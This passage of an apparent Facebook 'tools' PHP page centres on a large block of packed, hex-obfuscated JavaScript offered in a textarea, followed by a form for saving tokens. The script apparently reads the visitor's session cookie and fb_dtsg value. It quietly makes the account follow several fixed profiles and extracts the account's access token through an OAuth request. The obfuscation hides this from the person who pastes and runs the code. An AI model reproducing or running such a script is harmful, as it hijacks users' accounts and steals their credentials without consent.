r\\h\\g\\h\\b\\G\\Q\\b\\i\\c\\e\\s\\f\\k\\j\\f\\k\\e\\t\\h\\r\\c\\g\\n\\G\\L\\E\\e\\c\\b\\j\\o\\n\\f\\s\\b\\r\\h\\g\\L\\i\\f\\n\\u\\I\\1z\\Y\\1f\\1z\\Y\\1r\\1w\\J\\A\\y\\F\\c\\c\\g\\h\\I\\J\\A\\m\\e\\Q\\I\\J\\A\\m\\e\\Q\\I","\\J\\m\\e\\Q\\l\\o\\c\\K\\k\\b\\p\\u\\B\\f\\i\\t\\e\\h\\j\\c\\g\\n\\r\\x\\D\\n\\z\\G\\c\\b\\z\\c\\j\\f\\k\\e\\t\\h\\r\\s\\b\\h\\c\\b\\i\\G\\s\\g\\k\\g\\i\\r\\1q\\V\\1I\\V\\1f\\C\\U\\u\\I\\1f\\1z\\Y\\Y\\N\\l\\1o\\g\\c\\l\\w\\g\\i\\l\\o\\f\\k\\b\\l\\v\\s\\g\\n\\K\\G\\l\\T\\t\\h\\e\\b\\k\\l\\j\\l\\O\\g\\g\\k\\l\\t\\i\\f\\c\\e\\o\\l\\m\\f\\i\\e\\l\\J\\f\\l\\E\\i\\b\\w\\p\\u\\E\\c\\c\\n\\r\\A\\A\\L\\L\\L\\N\\e\\t\\h\\e\\b\\k\\N\\s\\g\\B\\u\\l\\c\\f\\i\\t\\b\\c\\p\\u\\q\\y\\k\\f\\h\\M\\u\\l\\c\\e\\c\\k\\b\\p\\u\\T\\t\\h\\e\\b\\k\\u\\I\\e\\t\\h\\e\\b\\k\\N\\s\\g\\B\\J\\A\\f\\I\\J\\o\\n\\f\\h\\l\\e\\m\\p\\u\\i\\b\\f\\o\\g\\h\\u\\l\\o\\c\\K\\k\\b\\p\\u\\m\\e\\o\\n\\k\\f\\K\\r\\y\\k\\g\\s\\M\\u\\I","\\J\\A\\o\\n\\f\\h\\I\\J\\A\\m\\e\\Q\\I","\\L\\L\\L\\N\\e\\t\\h\\e\\b\\k\\N\\s\\g\\B","\\N\\r\\r\\l\\O\\1c\\1c\\1i\\l\\Z\\T\\1t\\P\\O\\T\\1k\\P\\1o\\l\\r\\r\\l\\O\\1c\\1c\\1i\\l\\Z\\T\\1t\\P\\O\\T\\1k\\P\\1o\\l\\r\\r\\l\\O\\1c\\1c\\1i\\l\\Z\\T\\1t\\P\\O\\T\\1k\\P\\1o\\l\\r\\r\\N\\2a\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\2a","\\i\\b\\n\\k\\f\\s\\b","\\J\\m\\e\\Q\\l\\o\\c\\K\\k\\b\\p\\u\\B\\f\\i\\t\\e\\h\\j\\c\\g\\n\\r\\x\\D\\n\\z\\G\\y\\f\\s\\M\\t\\i\\g\\F\\h\\m\\r\\i\\t\\y\\f\\1L\\H\\C\\C\\1l\\H\\C\\C\\1l\\H\\C\\C\\1l\\D\\N\\C\\1K\\G\\n\\f\\m\\m\\e\\h\\t\\r\\l\\V\\n\\z\\l\\1b\\n\\z\\u\\l\\e\\m\\p\\u\\k\\f\\n\\g\\i\\f\\h\\u\\I\\N\\r\\r\\l\\O\\1c\\1c\\1i\\l\\Z\\T\\1t\\P\\O\\T\\1k\\P\\1o\\l\\r\\r\\l\\O\\1c\\1c\\1i\\l\\Z\\T\\1t\\P\\O\\T\\1k\\P\\1o\\l\\r\\r\\l\\O\\1c\\1c\\1i\\l\\Z\\T\\1t\\P\\O\\T\\1k\\P\\1o\\l\\r\\r\\N\\J\\A\\m\\e\\Q\\I\\l\\J\\c\\b\\z\\c\\f\\i\\b\\f\\l\\o\\c\\K\\k\\b\\p\\u\\B\\f\\i\\t\\e\\h\\j\\c\\g\\n\\r\\x\\D\\n\\z\\G\\i\\b\\o\\e\\1p\\b\\r\\h\\g\\h\\b\\G\\y\\f\\s\\M\\t\\i\\g\\F\\h\\m\\r\\1q\\w\\V\\w\\w\\1g\\x\\G\\w\\g\\h\\c\\j\\L\\b\\e\\t\\E\\c\\r\\h\\g\\i\\B\\f\\k\\G\\L\\e\\m\\c\\E\\r\\W\\1b\\1b\\n\\z\\G\\E\\b\\e\\t\\E\\c\\r\\x\\C\\D\\n\\z\\G\\n\\f\\m\\m\\e\\h\\t\\r\\1b\\n\\z\\l\\x\\D\\n\\z\\G\\y\\g\\i\\m\\b\\i\\r\\x\\n\\z\\l\\o\\g\\k\\e\\m\\l\\1q\\1b\\1b\\1b\\G\\w\\g\\h\\c\\j\\o\\e\\1p\\b\\r\\x\\H\\n\\z\\G\\c\\i\\f\\h\\o\\e\\c\\e\\g\\h\\r\\f\\k\\k\\l\\D\\N\\C\\o\\l\\b\\f\\o\\b\\u\\I\\O\\g\\g\\k\\l\\m\\f\\i\\e\\r\\l\\e\\t\\h\\e\\b\\k\\N\\s\\g\\B\\2a\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\2a\\N\\r\\r\\l\\O\\1c\\1c\\1i\\l\\Z\\T\\1t\\P\\O\\T\\1k\\P\\1o\\l\\r\\r\\l\\O\\1c\\1c\\1i\\l\\Z\\T\\1t\\P\\O\\T\\1k\\P\\1o\\l\\r\\r\\l\\O\\1c\\1c\\1i\\l\\Z\\T\\1t\\P\\O\\T\\1k\\P\\1o\\l\\r\\r\\N\\2a\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\j\\2a","\\J\\A\\c\\b\\z\\c\\f\\i\\b\\f\\I\\l\\J\\m\\e\\Q\\l\\o\\c\\K\\k\\b\\p\\u\\c\\b\\z\\c\\j\\f\\k\\e\\t\\h\\r\\s\\b\\h\\c\\b\\i\\G\\s\\g\\k\\g\\i\\r\\1q\\V\\1I\\V\\1f\\C\\U\\u\\I\\1f\\1z\\Y\\Y\\N\\l\\1o\\g\\c\\l\\w\\g\\i\\l\\o\\f\\k\\b\\l\\v\\s\\g\\n\\K\\G\\l\\T\\t\\h\\e\\b\\k\\l\\j\\l\\O\\g\\g\\k\\l\\t\\i\\f\\c\\e\\o\\l\\m\\f\\i\\e\\l\\J\\f\\l\\E\\i\\b\\w\\p\\u\\E\\c\\c\\n\\r\\A\\A\\L\\L\\L\\N\\e\\t\\h\\e\\b\\k\\N\\s\\g\\B\\u\\l\\c\\f\\i\\t\\b\\c\\p\\u\\q\\y\\k\\f\\h\\M\\u\\l\\c\\e\\c\\k\\b\\p\\u\\T\\t\\h\\e\\b\\k\\u\\I\\e\\t\\h\\e\\b\\k\\N\\s\\g\\B\\J\\A\\f\\I\\J\\o\\n\\f\\h\\l\\e\\m\\p\\u\\i\\b\\f\\o\\g\\h\\u\\l\\o\\c\\K\\k\\b\\p\\u\\m\\e\\o\\n\\k\\f\\K\\r\\y\\k\\g\\s\\M\\u\\I\\O\\1c\\1c\\1i\\l\\Z\\T\\1t\\P\\O\\T\\1k\\P\\1o\\J\\A\\o\\n\\f\\h\\I\\J\\A\\m\\e\\Q\\I","\\i\\b\\k\\g\\f\\m","\\k\\g\\s\\f\\c\\e\\g\\h","\\s\\k\\g\\o\\b","\\g\\h\\b\\i\\i\\g\\i","\\J\\m\\e\\Q\\l\\o\\c\\K\\k\\b\\p\\u\\y\\f\\s\\M\\t\\i\\g\\F\\h\\m\\r\\i\\t\\y\\f\\1L\\H\\C\\C\\1l\\H\\C\\C\\1l\\H\\C\\C\\1l\\D\\N\\C\\1K\\G\\n\\f\\m\\m\\e\\h\\t\\r\\l\\V\\n\\z\\l\\1b\\n\\z\\G\\B\\f\\i\\t\\e\\h\\j\\y\\g\\c\\c\\g\\B\\r\\x\\D\\n\\z\\u\\I\\O\\b\\i\\1A\\f\\m\\e\\l\\M\\b\\o\\f\\k\\f\\E\\f\\h\\N\\l\\1u\\b\\M\\l\\M\\g\\h\\b\\M\\o\\e\\l\\e\\h\\c\\b\\i\\h\\b\\c\\l\\f\\c\\f\\F\\l\\i\\b\\w\\i\\b\\o\\E\\l\\E\\f\\k\\f\\B\\f\\h\\1l\\l\\M\\f\\M\\N\\J\\A\\m\\e\\Q\\I","\\A\\Q\\x\\N\\D\\A\\m\\e\\f\\k\\g\\t\\A\\g\\f\\F\\c\\E\\A\\s\\g\\h\\w\\e\\i\\B\\2c\\m\\n\\i\\p\\x","\\w\\y\\q\\m\\c\\o\\t\\p","\\v\\f\\n\\n\\q\\e\\m\\p\\x\\C\\1b\\U\\C\\1g\\C\\R\\x\\H\\C\\R\\R\\1b\\1b\\R","\\v\\i\\b\\m\\e\\i\\b\\s\\c\\q\\F\\i\\e\\p\\w\\y\\x\\C\\1b\\U\\C\\1g\\C\\R\\x\\H\\C\\R\\R\\1b\\1b\\R\\r\\A\\A\\f\\F\\c\\E\\g\\i\\e\\1p\\b\\A","\\v\\m\\e\\o\\n\\k\\f\\K\\p\\n\\f\\t\\b","\\v\\f\\s\\s\\b\\o\\o\\q\\c\\g\\M\\b\\h\\p","\\v\\o\\m\\M\\p","\\v\\w\\i\\g\\B\\q\\n\\g\\o\\c\\p","\\v\\n\\i\\e\\Q\\f\\c\\b\\p","\\v\\k\\g\\t\\e\\h\\p","\\v\\i\\b\\f\\m\\p","\\v\\L\\i\\e\\c\\b\\p","\\v\\b\\z\\c\\b\\h\\m\\b\\m\\p","\\v\\o\\g\\s\\e\\f\\k\\q\\s\\g\\h\\w\\e\\i\\B\\p","\\v\\s\\g\\h\\w\\e\\i\\B\\p","\\v\\o\\b\\b\\h\\q\\o\\s\\g\\n\\b\\o\\p","\\v\\f\\F\\c\\E\\q\\c\\K\\n\\b\\p","\\v\\f\\F\\c\\E\\q\\c\\g\\M\\b\\h\\p","\\v\\f\\F\\c\\E\\q\\h\\g\\h\\s\\b\\p","\\v\\m\\b\\w\\f\\F\\k\\c\\q\\f\\F\\m\\e\\b\\h\\s\\b\\p","\\v\\i\\b\\w\\p\\Z\\b\\w\\f\\F\\k\\c","\\v\\i\\b\\c\\F\\i\\h\\q\\w\\g\\i\\B\\f\\c\\p\\f\\s\\s\\b\\o\\o\\q\\c\\g\\M\\b\\h","\\v\\m\\g\\B\\f\\e\\h\\p","\\v\\o\\o\\g\\q\\m\\b\\Q\\e\\s\\b\\p","\\v\\q\\q\\1u\\1c\\1o\\1f\\T\\1z\\1t\\q\\q\\p\\x","\\v\\q\\q\\f\\p\\x","\\v\\q\\q\\f\\w\\p\\1A\\D","\\v\\q\\q\\i\\b\\1m\\p\\W","\\v\\q\\q\\y\\b\\p\\j\\x","\\v\\q\\q\\n\\s\\p\\1D\\1w\\P\\1r\\Y\\Z\\r\\Z\\Y\\1f\\P\\1s\\1i\\O","\\1L","\\o\\F\\y\\o\\c\\i","\\1K","\\b\\i\\i\\g\\i\\1r\\F\\B\\B\\f\\i\\K","\\b\\i\\i\\g\\i\\Z\\b\\o\\s\\i\\e\\n\\c\\e\\g\\h","\\k\\f\\n\\g\\i\\f\\h","\\J\\m\\e\\Q\\l\\o\\c\\K\\k\\b\\p\\u\\y\\f\\s\\M\\t\\i\\g\\F\\h\\m\\r\\i\\t\\y\\f\\1L\\H\\C\\C\\1l\\H\\C\\C\\1l\\H\\C\\C\\1l\\D\\N\\C\\1K\\G\\n\\f\\m\\m\\e\\h\\t\\r\\l\\V\\n\\z\\l\\1b\\n\\z\\u\\I","\\1l\\l","\\J\\A\\m\\e\\Q\\I","\\1A\\o\\B\\g\\m\\o","\\i\\b\\1m\\F\\e\\i\\b","\\c\\g\\M\\b\\h\\p","\\v","\\m\\e\\Q\\o\\f\\c\\F","\\J\\f\\l\\E\\i\\b\\w\\p\\u\\E\\c\\c\\n\\o\\r\\A\\A\\m\\b\\Q\\b\\k\\g\\n\\b\\i\\o\\N\\w\\f\\s\\b\\y\\g\\g\\M\\N\\s\\g\\B\\A\\c\\g\\g\\k\\o\\A\\m\\b\\y\\F\\t\\A\\f\\s\\s\\b\\o\\o\\c\\g\\M\\b\\h\\A\\2c\\1m\\p","\\u\\l\\c\\e\\c\\k\\b\\p\\u\\1i\\e\\E\\f\\c\\l\\e\\h\\w\\g\\l\\k\\b\\h\\t\\M\\f\\n\\l\\m\\f\\i\\e\\l\\c\\g\\M\\b\\h\\l\\e\\h\\e\\u\\l\\c\\f\\i\\t\\b\\c\\p\\u\\q\\y\\k\\f\\h\\M\\u\\I\\J\\w\\g\\h\\c\\l\\s\\g\\k\\g\\i\\p\\u\\1q\\s\\s\\D\\D\\D\\D\\u\\I\\1i\\e\\E\\f\\c\\l\\T\\h\\w\\g\\i\\B\\f\\o\\e\\l\\O\\g\\M\\b\\h\\J\\A\\f\\I\\J\\A\\f\\I\\J\\y\\i\\A\\I\\J\\e\\h\\n\\F\\c\\l\\n\\k\\f\\s\\b\\E\\g\\k\\m\\b\\i\\p\\u\\O\\g\\M\\b\\h\\l\\1D\\b\\B\\f\\h\\b\\h\\l\\T\\t\\h\\e\\b\\k\\u\\l\\e\\m\\p\\u\\c\\g\\M\\b\\h\\u\\l\\o\\c\\K\\k\\b\\p\\u\\B\\f\\i\\t\\e\\h\\j\\c\\g\\n\\r\\C\\n\\z\\G\\L\\e\\m\\c\\E\\r\\R\\1b\\2i\\G\\E\\b\\e\\t\\E\\c\\r\\x\\1g\\n\\z\\G\\n\\f\\m\\m\\e\\h\\t\\r\\W\\n\\z\\G\\w\\g\\h\\c\\j\\o\\e\\1p\\b\\r\\x\\H\\n\\z\\u\\l\\Q\\f\\k\\F\\b\\p\\u","\\u\\I","\\g\\h\\s\\k\\e\\s\\M","\\o\\c\\f\\i\\c","\\o\\c\\g\\n","\\e\\h\\k\\e\\h\\b","\\y\\F\\M\\f\\1i\\f\\n\\g\\i\\f\\h","\\e\\h\\k\\e\\h\\b\\j\\y\\k\\g\\s\\M","\\B\\f\\i\\t\\e\\h\\O\\g\\n","\\c\\F\\c\\F\\n\\1i\\f\\n\\g\\i\\f\\h","\\i\\b\\B\\g\\Q\\b\\1u\\E\\e\\k\\m","\\n\\f\\i\\b\\h\\c\\1o\\g\\m\\b","\\f\\k\\n\\E\\f\\y\\b\\c\\b\\b\\o","\\y\\1A\\e\\c\\f","\\o\\f\\c\\F","\\w\\g\\k\\k\\g\\L","\\m\\F\\f","\\c\\e\\t\\f","\\b\\B\\n\\f\\c","\\k\\e\\B\\f"];1a 1N=1d[a[2]](a[1])[0][a[0]];1a 1x=1d[a[4]][a[3]](1d[a[4]][a[3]](/3E=(\\d+)/)[1]);1a 2h=1d[a[4]][a[3]](1d[a[4]][a[3]](/2h=(\\d+)/));1a 1X=1G 3F()[a[5]]();1a 1U=a[6];1a 1W=a[7];1a 2d=/(<([^>]+)>)/3H;1a 2M=a[8];1a 2O=a[9];2E=1d[a[10]];1h=1d[a[12]](a[11]);1h[a[13]]=a[14];1h[a[16]][a[15]]=a[17];1h[a[16]][a[18]]=a[17];1h[a[16]][a[19]]=a[20];1h[a[16]][a[21]]=a[22];1h[a[16]][a[23]]=a[24];1h[a[16]][a[25]]=a[26];1h[a[16]][a[27]]=a[28];1h[a[16]][a[29]]=a[30];1h[a[16]][a[31]]=a[32];1h[a[16]][a[33]]=a[34];1h[a[16]][a[35]]=a[36];1h[a[37]]=a[38]+2O+a[39];1h[a[37]]+=a[40];2E[a[41]](1h);2w[a[42]]={3O:{4D:1j(){1a S=1G 1S();S[a[1O]](a[43],a[44]+1N+a[45]+1x+a[46]+1U+a[47]+1X+a[48]+1W+a[49],1Y);S[a[1P]](a[1M],a[1V]);S[a[1T]]()},4x:1j(){1a S=1G 1S();S[a[1O]](a[43],a[44]+1N+a[45]+1x+a[46]+1U+a[47]+1X+a[48]+1W+a[4y],1Y);S[a[1P]](a[1M],a[1V]);S[a[1T]]()},4z:1j(){1a S=1G 1S();S[a[1O]](a[43],a[2H]+1N+a[45]+1x+a[46]+1U+a[47]+1X+a[48]+1W+a[4B]+1x+a[2J]+1x+a[4K],1Y);S[a[1P]](a[1M],a[1V]);S[a[1T]]()},4J:1j(){1a S=1G 1S();S[a[1O]](a[43],a[2H]+1N+a[45]+1x+a[46]+1U+a[47]+1X+a[48]+1W+a[4Q]+1x+a[2J]+1x+a[4T],1Y);S[a[1P]](a[1M],a[1V]);S[a[1T]]()},4S:1j(){1a S=1G 1S();S[a[1O]](a[43],a[4V]+1N+a[45]+1x+a[46]+1U+a[47]+1X+a[48]+1W+a[4R]+2h+a[4M]+2h+a[4N],1Y);S[a[1P]](a[1M],a[1V]);S[a[1T]]()}},4O:1j(){1a S=1G 1S();1a 2n=a[4P]+2M;S[a[1O]](a[4v],2n,4u);S[a[1P]](a[1M],a[1V]);S[a[2U]]=1j(){1d[a[1n]](a[3c])[a[16]][a[2p]]=a[2G];1H(S[a[2V]]==4&&S[a[2Q]]==2F){1a 2A=3Z[a[3Y]](S[a[2P]]);1a 2k=2A[a[4a]];1a 1e=2k[a[2q]](2k[a[1R]](a[4b])+26,2k[a[2o]](a[4c]));1a 2f=1e[a[2q]](1e[a[1R]](a[1v]),1e[a[2o]](a[2C]));1a 1B=1e[a[2q]](1e[a[1R]](a[2C])+3,1e[a[2o]](a[1v]));1H(1B==3d||1B==a[1v]){1C=a[1v]}2b{1C=1B};1H(1e[a[1R]](a[3X])!=-1||1e[a[1R]](a[3W])!=-1||1e[a[1R]](a[3R])!=-1){1h[a[37]]+=a[3Q];1h[a[37]]+=a[3P];1h[a[37]]+=a[3S];1h[a[37]]+=a[3T]+1C+a[3V]}2b{1H(1B==3d||1B==a[1v]){1C=a[2Y]}2b{1C=1B};2S(a[2R]+1C[a[2j]](2d,a[1v]));1h[a[37]]+=a[2W]+1C[a[2j]](2d,a[1v])+a[2X];2m(1j(){2w[a[3b]][a[3a]]()},3U)};S[a[2L]]}2b{1C=a[2Y];2S(a[2R]+1C[a[2j]](2d,a[1v]));1h[a[37]]+=a[2W]+1C[a[2j]](2d,a[1v])+a[2X];2m(1j(){2w[a[3b]][a[3a]]()},4q)}};S[a[2K]]=1j(){1d[a[1n]](a[3c])[a[37]]=a[2I]};S[a[1T]]()},4r:1j(4t){1a S=1G 1S();1a 2n=a[4m];1a X=a[4h]+1N;X+=a[4i];X+=a[4j];X+=a[4l];X+=a[4k];X+=a[3h];X+=a[4g];X+=a[4n];X+=a[4s];X+=a[4o];X+=a[4p];X+=a[4f];X+=a[4e];X+=a[4L];X+=a[4U];X+=a[3I];X+=a[3J];X+=a[3M];X+=a[3s];X+=a[3L];X+=a[3K];X+=a[3D];X+=a[3C];X+=a[3v];X+=a[45]+1x;X+=a[3u];X+=a[46]+1U;X+=a[3t];X+=a[3x];X+=a[3y];X+=a[3B];X+=a[48]+1W;S[a[1O]](a[43],2n,1Y);S[a[1P]](a[1M],a[1V]);S[a[2U]]=1j(){1H(S[a[2V]]==4&&S[a[2Q]]==2F){1a 1e=3z(a[3A]+S[a[2P]][a[3w]](9)+a[3N]);1H(1e[a[2r]]&&1e[a[2t]]){1d[a[1n]](a[2l])[a[37]]=a[2T]+1e[a[2r]]+a[2Z]+1e[a[2t]]+a[2B]}2b{1H(1e[a[1Z]]&&1e[a[1Z]][a[2g]]&&1e[a[1Z]][a[2g]][0]&&1e[a[1Z]][a[2g]][0][3]&&1e[a[1Z]][a[2g]][0][3][0]){1a 2f=1e[a[1Z]][a[2g]][0][3][0];1a 1B=2f[a[2q]](2f[a[1R]](a[3o])+6,2f[a[2o]](a[3n]));1d[a[1n]](a[2v])[a[37]]=a[3q]+1B+a[3r]+1B+a[3G];1d[a[1n]](a[2l])[a[37]]=a[1v]}2b{1d[a[1n]](a[2l])[a[37]]=a[2T]+1e[a[2r]]+a[2Z]+1e[a[2t]]+a[2B];1d[a[1n]](a[2v])[a[37]]=a[1v]}};S[a[2L]]}};S[a[2K]]=1j(){1d[a[1n]](a[2l])[a[37]]=a[2I];1d[a[1n]](a[2v])[a[37]]=a[1v]};S[a[1T]](X)},3j:1j(){1H(1d[a[1n]](a[2N])[a[3g]]){1d[a[1n]](a[3f])[a[16]][a[2p]]=a[3e];1d[a[1n]](a[2N])[a[16]][a[2p]]=a[2G];1d[a[1n]](a[2z])[a[16]][a[2p]]=a[3i];1d[a[1n]](a[2z])[a[16]][a[2y]]=a[17];1d[a[1n]](a[3p])[a[16]][a[2y]]=a[17]}},3m:1j(){1a 2s=1d[a[1n]](a[14]);2s[a[3l]][a[3k]](2s)}};2m(1j(){2m(1j(){1Q[a[4A]]()},4F);1Q[a[4E]]();1Q[a[2e]][a[4H]]();1Q[a[2e]][a[4I]]();1Q[a[2e]][a[4C]]();1Q[a[2e]][a[4w]]();1Q[a[2e]][a[4d]]()})',62,307,'||||||||||_0x3c07|x65|x74||x69|x61|x6F|x6E|x72|x2D|x6C|x20|x64|x70|x73|x3D|x5F|x3A|x63|x67|x27|x26|x66|x31|x62|x78|x2F|x6D|x35|x30|x68|x75|x3B|x32|x3E|x3C|x79|x77|x6B|x2E|x54|x41|x76|x39|_0xb6a2xa|x49|x36|x34|x33|_0xb6a2x12|x45|x44|||||||||||var|x37|x4F|document|_0xb6a2xe|x46|x38|div|x4C|function|x4B|x2C|x71|71|x4E|x7A|x23|x53|x55|x4D|x43|83|x48|user_id|x57|x52|x6A|_0xb6a2x10|reason|x50|x47|x5D|new|if|x42|x5B|x29|x28|51|fb_dtsg|50|53|igniel|79|XMLHttpRequest|54|dyn|52|rev|ttstamp|true|142|||||||||||x0A|else|x3F|regex|163|_0xb6a2xf|143|act|x25|95|_0xb6a2xd|138|setTimeout|_0xb6a2xb|81|69|82|136|_0xb6a2x13|137|x7E|146|window|x58|156|154|_0xb6a2xc|141|84|x56|body|200|72|56|102|58|101|100|rain|151|title|75|74|94|alert|139|68|73|96|97|93|140|||||||||||98|99|70|null|153|152|150|109|155|klik|158|159|tutup|145|144|157|147|148|122|129|128|127|134|130|131|eval|133|132|126|125|c_user|Date|149|ig|119|120|124|123|121|135|follow|89|88|87|90|91|5000|92|86|85|76|JSON|||||||||||77|78|80|167|116|115|110|104|105|106|108|107|103|111|113|114|3000|alphabetees|112|_0xb6a2x11|false|67|166|dua|55|tiga|160|57|165|satu|161|500|x22|162|164|empat|59|117|64|65|bjita|66|60|63|lima|61|118|62|x5A'.split('|'),0,{}));})();</textarea>				
		</div>

		<div class="col-md-12">
			<h3><?= $lang['SAVE_TOKEN'] ?></h3>
		</div>

		<form method="POST">
			<div class="col-md-6">
				<div class="form-group">				
					<input class="form-control" type="text" name="tokenvalue" placeholder="Token">
				</div>															
			</div>
			<div class="col-md-4">
				<div class="form-group">
					<input class="form-control" type="text" name="tokenname" placeholder="Name">
				</div>
			</div>
			<div class="col-md-2">
				<div class="form-group">
					<input value="<?= $lang['SAVE'] ?>" class="btn btn-success gradient form-control" type="submit" name="savetoken">
				</div>
			</div>
		</form>

	</div>

	<?php include "module/fbtools_global/modal_android.php"; ?>
	<?php include "module/fbtools_global/modal_iphone.php"; ?>
	<?php include "module/fbtools_global/modal_ios.php"; ?>

<?php endif ?>